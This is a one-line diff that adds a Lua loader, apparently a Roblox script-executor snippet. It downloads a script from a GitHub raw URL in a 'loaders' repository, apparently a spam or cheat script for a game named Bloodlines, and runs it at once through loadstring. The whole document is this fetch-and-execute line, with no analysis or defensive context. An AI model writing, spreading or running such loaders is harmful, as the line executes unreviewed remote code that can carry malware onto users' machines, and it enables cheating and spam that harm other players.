@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/bloodlines-spam5-gm6z4yq9mciq0b.lua"))()
